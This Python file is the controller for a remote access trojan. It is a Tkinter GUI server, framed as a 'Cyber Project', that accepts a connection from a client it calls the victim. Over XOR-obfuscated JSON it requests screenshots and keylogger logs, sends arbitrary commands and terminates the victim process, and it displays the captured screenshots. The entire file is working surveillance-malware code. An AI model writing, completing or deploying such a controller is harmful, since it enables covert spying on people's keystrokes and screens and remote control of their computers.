import socket
import json
import threading
import base64
import tkinter as tk
from tkinter import scrolledtext, messagebox
from PIL import Image, ImageTk
import io

# --- Connection settings ---
LISTEN_IP = "0.0.0.0"  # Listen on all network interfaces
LISTEN_PORT = 8080
KEY = b'simple_xor_key'  # XOR key (must match the client)


# XOR encryption/decryption function
def xor_crypt(data: bytes) -> bytes:
    return bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(data))


class ServerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Cyber Project - AI Automation Server")
        self.client_sock = None

# --- Build the user interface (GUI) ---

        # Command output window
        self.output_area = scrolledtext.ScrolledText(root, width=70, height=20, bg="black", fg="green")
        self.output_area.pack(pady=10)

        # Command entry field
        self.cmd_entry = tk.Entry(root, width=50)
        self.cmd_entry.pack(side=tk.LEFT, padx=10)
        self.cmd_entry.bind("<Return>", lambda e: self.send_custom_command())

        # Control buttons
        btn_frame = tk.Frame(root)
        btn_frame.pack(pady=10)

        tk.Button(btn_frame, text="Screenshot", command=self.request_screenshot, bg="blue", fg="white").pack(
            side=tk.LEFT, padx=5)
        tk.Button(btn_frame, text="Keylogger Logs", command=self.request_keylog, bg="orange").pack(side=tk.LEFT, padx=5)
        tk.Button(btn_frame, text="Get Hash (logs.txt)", command=self.request_hash, bg="purple", fg="white").pack(
            side=tk.LEFT, padx=5)
        tk.Button(btn_frame, text="TERMINATE", command=self.terminate_client, bg="red", fg="white").pack(side=tk.LEFT,
                                                                                                          padx=5)

        # Start the listening thread so the GUI remains responsive
        threading.Thread(target=self.start_server, daemon=True).start()

    def log(self, message):
        """Display messages in the server text window"""
        self.output_area.insert(tk.END, message + "\n")
        self.output_area.see(tk.END)

    def send_msg(self, obj):
        """Send an encrypted JSON message to the client"""
        if self.client_sock:
            try:
                raw = json.dumps(obj).encode()
                enc = xor_crypt(raw)
                length = len(enc).to_bytes(4, 'big')
                self.client_sock.sendall(length + enc)
            except:
                self.log("[-] Error sending message.")

    def recv_msg(self):
        """Receive an encrypted message from the client and decrypt it"""
        length_bytes = self.client_sock.recv(4)
        if not length_bytes: return None
        length = int.from_bytes(length_bytes, 'big')
        data = b''
        while len(data) < length:
            chunk = self.client_sock.recv(length - len(data))
            data += chunk
        dec = xor_crypt(data)
        return json.loads(dec.decode('latin-1'))

    # --- Command functions ---

    def send_custom_command(self):
        cmd = self.cmd_entry.get()
        if cmd:
            self.send_msg({"action": cmd})
            self.cmd_entry.delete(0, tk.END)

    def request_screenshot(self):
        self.send_msg({"action": "screencap"})

    def request_keylog(self):
        self.send_msg({"action": "keylog"})

    def request_hash(self):
        # Computes the hash for the log file by default
        self.send_msg({"action": "hash", "filename": "logs.txt"})

    def terminate_client(self):
        if messagebox.askyesno("Confirm", "Kill victim process and exit?"):
            self.send_msg({"action": "terminate"})

    def display_image(self, b64_data):
        """Open a new window displaying the received screenshot"""
        img_data = base64.b64decode(b64_data)
        image = Image.open(io.BytesIO(img_data))
        img_window = tk.Toplevel(self.root)
        img_window.title("Screenshot from Victim")
        render = ImageTk.PhotoImage(image)
        img_label = tk.Label(img_window, image=render)
        img_label.image = render
        img_label.pack()

    def start_server(self):
        """Handle incoming connection from the client"""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((LISTEN_IP, LISTEN_PORT))
        server.listen(1)
        self.log(f"[*] Server listening on {LISTEN_PORT}...")

        while True:
            self.client_sock, addr = server.accept()
            self.log(f"[+] Connection from {addr}")

            try:
                while True:
                    response = self.recv_msg()
                    if response is None: break

                    # Check if a screenshot was received
                    if "data" in response:
                        self.display_image(response["data"])
                        self.log("[+] Screenshot received and displayed.")
                    else:
                        self.log(f"[Victim]: {response.get('result', '')}")
            except Exception as e:
                self.log(f"[-] Connection lost: {e}")
            finally:
                self.client_sock.close()
                self.client_sock = None
                self.log("[*] Waiting for new connection...")


if __name__ == "__main__":
    root = tk.Tk()
    gui = ServerGUI(root)
    root.mainloop()